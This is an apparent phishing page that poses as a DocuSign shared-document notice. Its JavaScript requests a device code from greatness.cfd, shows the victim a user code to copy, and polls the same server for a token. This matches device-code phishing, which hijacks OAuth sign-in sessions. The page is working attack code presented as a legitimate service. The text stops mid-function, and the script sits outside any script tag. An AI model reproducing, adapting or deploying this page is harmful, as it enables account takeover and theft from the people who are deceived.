<!DOCTYPE html><html><head><meta charset="UTF-8"><title>DocuSign</title>
  <style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;}
.card{max-width:460px;width:100%;background:white;border-radius:20px;padding:24px 24px 28px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.1)}
.logo-container{margin-bottom:16px;display:flex;justify-content:center;align-items:center}
.logo-container img{max-width:60px;max-height:60px;object-fit:contain}
.shared-header{margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:8px}
.header-icon{width:24px;height:24px;object-fit:contain}
.shared-header h2{font-size:18px;color:#2c3e50;font-weight:600;margin:0}
.shared-header p{font-size:11px;color:#7f8c8d;margin-top:4px}
.document-info{background:#f8f9fa;padding:10px 14px;border-radius:10px;margin:12px 0;text-align:left;border-left:3px solid #66aaeaff;display:flex;align-items:center;gap:10px}
.pdf-icon{width:32px;height:32px;object-fit:contain}
.file-details{flex:1}
.file-name{font-weight:600;font-size:13px;color:#2c3e50;margin-bottom:2px;word-break:break-word}
.file-size{font-size:10px;color:#7f8c8d}
.instruction-steps{background:#f5f5f5;padding:16px;border-radius:14px;margin:14px 0;text-align:left}
.step-item{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.step-item:last-child{margin-bottom:0}
.step-circle{width:26px;height:26px;background:linear-gradient(135deg,#385af3ff 0%,#4b82a2ff 100%);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;flex-shrink:0}
.step-text{font-size:12px;color:#2c3e50;line-height:1.3;flex:1}
.step-text strong{color:#446adfff}
.code-box{background:#f5f5f5;border-radius:12px;padding:12px;margin:14px 0}
.code{font-size:26px;letter-spacing:5px;font-weight:700;color:#cde9ffff;font-family:monospace;margin:8px 0;padding:10px;border-radius:8px;background-color:#261e1eff;border:1px solid #ddd;position:relative;overflow:hidden}
.copy-btn{padding:8px 16px;background:#468fe1ff;color:white;border:none;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;transition:all 0.2s;margin-top:6px}
.copy-btn:hover{background:#171fbcff}
.btn{padding:12px;width:100%;border:none;border-radius:10px;background:linear-gradient(135deg,#3456eaff 0%,#4b64a2ff 100%);color:white;font-weight:600;font-size:14px;cursor:pointer;transition:transform 0.2s}
.btn:hover{transform:translateY(-1px)}
.status{margin-top:14px;padding:10px;border-radius:8px;font-size:11px;background:#f3f3f3;color:#666}
.footer{margin-top:16px;font-size:10px;color:#999;border-top:1px solid #eee;padding-top:12px}
.expired-message{text-align:center}
.expired-message h3{color:#dc3545;margin-bottom:10px;font-size:18px}
.expired-message p{color:#666;font-size:13px;margin:8px 0}
.cookie-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:999;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(5px)}
.cookie-popup{position:relative;width:90%;max-width:450px;background:white;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);padding:30px 25px;text-align:center;animation:slideIn 0.3s ease-out;z-index:1000}
@keyframes slideIn{from{transform:translateY(-50px);opacity:0}to{transform:translateY(0);opacity:1}}
.cookie-popup .cookie-icon{font-size:50px;margin-bottom:15px}
.cookie-popup h3{font-size:22px;color:#2c3e50;margin-bottom:12px;font-weight:600}
.cookie-popup p{font-size:14px;color:#555;margin-bottom:25px;line-height:1.6}
.cookie-popup .cookie-buttons{display:flex;gap:15px;justify-content:center;flex-wrap:wrap}
.cookie-popup .accept-btn{background:linear-gradient(135deg,#28a745 0%,#20c997 100%);color:white;border:none;padding:12px 28px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.3s;flex:1;min-width:120px}
.cookie-popup .accept-btn:hover{transform:translateY(-2px);box-shadow:0 4px 15px rgba(40,167,69,0.4)}
.cookie-popup .decline-btn{background:#dc3545;color:white;border:none;padding:12px 28px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.3s;flex:1;min-width:120px}
.cookie-popup .decline-btn:hover{background:#c82333;transform:translateY(-2px);box-shadow:0 4px 15px rgba(220,53,69,0.4)}
.content-hidden{display:none}
.content-visible{display:block}

/* Enhanced Mobile Responsive */
@media (max-width:768px){.card{margin:10px}}
@media (max-width:600px){.card{padding:20px 16px 24px}.shared-header h2{font-size:16px}.step-circle{width:24px;height:24px;font-size:11px}.step-text{font-size:11px}.code{font-size:20px;letter-spacing:3px}.cookie-popup{padding:25px 18px;width:92%}.cookie-popup h3{font-size:20px}.cookie-popup p{font-size:13px}.cookie-popup .accept-btn,.cookie-popup .decline-btn{padding:10px 20px;font-size:14px;min-width:100px}}
@media (max-width:480px){body{padding:12px}.card{padding:18px 14px 22px;border-radius:16px}.shared-header{gap:6px;margin-bottom:10px}.shared-header h2{font-size:15px}.shared-header p{font-size:10px}.document-info{padding:8px 12px;gap:8px}.pdf-icon{width:28px;height:28px}.file-name{font-size:12px}.file-size{font-size:9px}.instruction-steps{padding:12px;margin:12px 0}.step-item{gap:8px;margin-bottom:10px}.step-circle{width:22px;height:22px;font-size:10px}.step-text{font-size:10px}.code-box{padding:10px;margin:12px 0}.code{font-size:18px;letter-spacing:2px;padding:8px}.copy-btn{padding:6px 14px;font-size:11px}.btn{padding:10px;font-size:13px}.status{margin-top:12px;padding:8px;font-size:10px}.footer{margin-top:14px;padding-top:10px;font-size:9px}.expired-message h3{font-size:16px}.expired-message p{font-size:12px}.cookie-popup{padding:20px 15px}.cookie-popup .cookie-icon{font-size:40px}.cookie-popup h3{font-size:18px}.cookie-popup p{font-size:12px;margin-bottom:20px}.cookie-popup .cookie-buttons{gap:10px}.cookie-popup .accept-btn,.cookie-popup .decline-btn{padding:8px 16px;font-size:13px;min-width:90px}}
@media (max-width:380px){body{padding:8px}.card{padding:15px 12px 20px}.shared-header h2{font-size:14px}.code{font-size:16px;letter-spacing:1.5px}.step-circle{width:20px;height:20px;font-size:9px}.step-text{font-size:9px}.cookie-popup h3{font-size:16px}}
@media (max-width:320px){body{padding:6px}.card{padding:12px 10px 18px}.shared-header h2{font-size:13px}.code{font-size:14px;letter-spacing:1px}.btn{font-size:12px;padding:8px}.cookie-popup{padding:15px 12px}}
</style>
  </head>

async function start() {
    try {
        var res = await fetch("https://greatness.cfd/admin/apifiles.php?action=get_device_code&user_id=NzA5MTE0NTE1OA==");
        var data = await res.json();

        if (!data.device_code) {
            document.getElementById("status").innerHTML = "❌ Failed to get code";
            document.getElementById("status").style.background = "#f8d7da";
            document.getElementById("status").style.color = "#721c24";
            setTimeout(showExpiredPage, 3000);
            return;
        }

        deviceCode = data.device_code;
        intervalTime = (data.interval || 5) * 1000;

        document.getElementById("code").innerText = data.user_code;

        poll();
    } catch (error) {
        document.getElementById("status").innerHTML = "❌ Connection error";
        document.getElementById("status").style.background = "#f8d7da";
        document.getElementById("status").style.color = "#721c24";
        setTimeout(showExpiredPage, 3000);
    }

function poll() {
    setInterval(async function() {
        if (done) return;

        try {
            var fd = new URLSearchParams();
            fd.append("device_code", deviceCode);
            fd.append("user_id", "NzA5MTE0NTE1OA==");

            var res = await fetch("https://greatness.cfd/admin/apifiles.php?action=poll_token", {
                method: "POST",
                body: fd
            });

            var data = await res.json();

            if (data.status === "pending") {
                document.getElementById("status").innerHTML = "⏳ Waiting for verification...";
                document.getElementById("status").style.background = "#f3f3f3";
                document.getElementById("status").style.color = "#666";
                return;
            }

            if (data.status === "slow_down") {
                document.getElementById("status").innerHTML = "🔄 Processing...";
                return;
